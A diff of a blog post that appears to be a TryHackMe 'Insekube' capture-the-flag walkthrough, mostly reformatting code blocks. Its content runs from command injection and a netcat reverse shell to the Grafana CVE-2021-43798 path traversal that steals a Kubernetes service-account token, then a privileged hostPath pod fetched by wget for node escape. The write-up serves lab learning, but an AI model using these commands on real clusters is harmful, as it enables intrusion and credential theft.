@@ -6,16 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="insekube.png" alt="insekube" width=200 >
+{{< post-img src="insekube.png" alt="insekube" style="width: 200px;" >}}
 
 ## Enumeration
 
-### Rustscan + nmap
 
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
 |   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
@@ -24,8 +23,8 @@ PORT   STATE SERVICE REASON  VERSION
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4
 80/tcp open  http    syn-ack
 |_http-title: Site doesn't have a title (text/html; charset=utf-8).
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     HTTP/1.1 200 OK
 |     Date: Mon, 28 Feb 2022 16:38:06 GMT
 |     Content-Type: text/html; charset=utf-8
@@ -45,13 +44,13 @@ PORT   STATE SERVICE REASON  VERSION
 |     <div class="container h-100">
 |     <div class="row mt-5">
 |     <div class="col-12 mb-4">
-|     class="text-center">Check if a website is down 
+|     class="text-center">Check if a website is down
 |     </h3>
 |     </div>
 |     <form class="col-6 mx-auto" action="/">
 |     <div class=" input-group">
 |     <input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 405 Method Not Allowed
 |     Date: Mon, 28 Feb 2022 16:38:06 GMT
 |     Content-Type: text/plain; charset=utf-8
@@ -59,7 +58,7 @@ PORT   STATE SERVICE REASON  VERSION
 |     Allow: GET, HEAD
 |     Connection: close
 |     Method Not Allowed
-|   RTSPRequest: 
+|   RTSPRequest:
 |     HTTP/1.1 405 Method Not Allowed
 |     Date: Mon, 28 Feb 2022 16:38:07 GMT
 |     Content-Type: text/plain; charset=utf-8
@@ -67,7 +66,7 @@ PORT   STATE SERVICE REASON  VERSION
 |     Allow: GET, HEAD
 |     Connection: close
 |_    Method Not Allowed
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
@@ -105,7 +104,7 @@ SF:lose\r\n\r\nMethod\x20Not\x20Allowed");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
 |   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
@@ -115,8 +114,8 @@ PORT   STATE SERVICE REASON  VERSION
 
 80/tcp open  http    syn-ack
 |_http-title: Site doesn't have a title (text/html; charset=utf-8).
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     HTTP/1.1 200 OK
 |     Date: Mon, 28 Feb 2022 16:38:06 GMT
 |     Content-Type: text/html; charset=utf-8
@@ -136,13 +135,13 @@ PORT   STATE SERVICE REASON  VERSION
 |     <div class="container h-100">
 |     <div class="row mt-5">
 |     <div class="col-12 mb-4">
-|     class="text-center">Check if a website is down 
+|     class="text-center">Check if a website is down
 |     </h3>
 |     </div>
 |     <form class="col-6 mx-auto" action="/">
 |     <div class=" input-group">
 |     <input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 405 Method Not Allowed
 |     Date: Mon, 28 Feb 2022 16:38:06 GMT
 |     Content-Type: text/plain; charset=utf-8
@@ -150,7 +149,7 @@ PORT   STATE SERVICE REASON  VERSION
 |     Allow: GET, HEAD
 |     Connection: close
 |     Method Not Allowed
-|   RTSPRequest: 
+|   RTSPRequest:
 |     HTTP/1.1 405 Method Not Allowed
 |     Date: Mon, 28 Feb 2022 16:38:07 GMT
 |     Content-Type: text/plain; charset=utf-8
@@ -158,7 +157,7 @@ PORT   STATE SERVICE REASON  VERSION
 |     Allow: GET, HEAD
 |     Connection: close
 |_    Method Not Allowed
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
@@ -197,13 +196,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-Now there is some obvious command injection 
+Now there is some obvious command injection
+The flag is in an environment variable so we check those!
+there is a command for that
 
-The flag is in an environment variable so we check those! 
-
-there is a command for that 
-
-```
+```bash
 ping: usage error: Destination address required
 KUBERNETES_SERVICE_PORT_HTTPS=443
 GRAFANA_SERVICE_HOST=10.108.133.228
@@ -237,11 +234,11 @@ GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
 _=/usr/bin/env
 
 ```
-Get acess (Reverse shell much)
+Get access (Reverse shell much)
 
 Get to the the [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) in /tmp
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 53060
@@ -254,9 +251,9 @@ ls
 kubectl
 challenge@syringe-79b66d66d7-7mxhd:/tmp$
 ```
-Now try interracting (just follow up) and get Secrets
+Now try interacting (just follow up) and get Secrets
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secrets
 ./kubectl get secrets
 NAME                    TYPE                                  DATA   AGE
@@ -288,12 +285,10 @@ challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret secretflag -o 'jso
 
 ```
 Flag is in obvious base64 encoding (duh)
-
-Now we try to get in with Grafana! 
-
+Now we try to get in with Grafana!
 use `curl` in the shell as grafana is only available locally (port forward would feel like overkill)
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://grafana:3000
 curl http://grafana:3000
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -302,7 +297,7 @@ curl http://grafana:3000
 <a href="/login">Found</a>.
 ```
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
 <-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -322,7 +317,7 @@ Now you got your [CVE](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) exploit 
 
 [This guy](https://j0vsec.com/post/cve-2021-43798/) explains it!
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
 </var/run/secrets/kubernetes.io/serviceaccount/token
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -333,7 +328,7 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtU
 ```
 that is a long JWT token (you should put it in a file...I won't but you should)
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 <bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 Resources                                       Non-Resource URLs                     Resource Names   Verbs
@@ -349,7 +344,7 @@ selfsubjectrulesreviews.authorization.k8s.io    []                              
 ```
 I directly go to the shell part...I can't keep pasting this long token
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 <bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 NAME                       READY   STATUS    RESTARTS       AGE
@@ -358,7 +353,7 @@ syringe-79b66d66d7-7mxhd   1/1     Running   1 (28d ago)    28d
 ```
 Do what you could not now
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get services --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 <bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE
@@ -376,18 +371,17 @@ syringe     1         52d
 
 Now for the shell
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
 <-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
 Unable to use a TTY - input is not a terminal or the right kind of file
 id
 uid=472(grafana) gid=0(root) groups=0(root)
-
 ```
 
 That will do!
 
-```
+```bash
 env
 KUBERNETES_SERVICE_PORT_HTTPS=443
 GRAFANA_SERVICE_HOST=10.108.133.228
@@ -428,12 +422,10 @@ OLDPWD=/usr/share/grafana
 ```
 
 Now Escape to the node (sounds cool)
-
 We gotta make our own pod. [kubernetes themselves]() tell you how
-
 So you need a `.yml` file like this
 
-```
+```bash
 apiVersion: v1
 kind: Pod
 metadata:
@@ -459,14 +451,14 @@ spec:
     volumes:
      - name: noderoot
        hostPath:
-        path: / 
+        path: /
 
 ```
 Make sure your file is well-formatted! I usually use a validator like [this one](https://jsonformatter.org/yaml-formatter)
 
 You can put all this in a 'privesc.yml' file (or anything) and upload it with a python server + wget
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
 <xhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
 --2022-02-28 19:30:12--  http://10.8.226.203:8000/privesc.yml
@@ -484,16 +476,16 @@ ls
 kubectl
 privesc.yml
 ```
-Now make the pod 
+Now make the pod
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl apply -f privesc.yml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 <bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 pod/everything-allowed-pod created
 ```
 Check it's presence
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 <bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
 NAME                          READY   STATUS             RESTARTS       AGE
@@ -503,7 +495,7 @@ syringe-79b66d66d7-7mxhd      1/1     Running            1 (28d ago)    28d
 ```
 Get a shell inside
 
-```
+```bash
 challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it everything-allowed-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
 <-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
 Unable to use a TTY - input is not a terminal or the right kind of file
@@ -512,7 +504,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 Now flag! Remember the mounting point is `host`
 
-```
+```bash
 cd host
 /bin/bash: line 6: cd: host: No such file or directory
 cd /host
@@ -546,13 +538,12 @@ var
 ```
 Now go in `/host/root`
 
-```
+```bash
 cd root
 ls
 root.txt
 cat root.txt
 flag{kuber_root_flag_for_kubernetes_pros}
 ```
-Awesome room! 
-
+Awesome room!
 
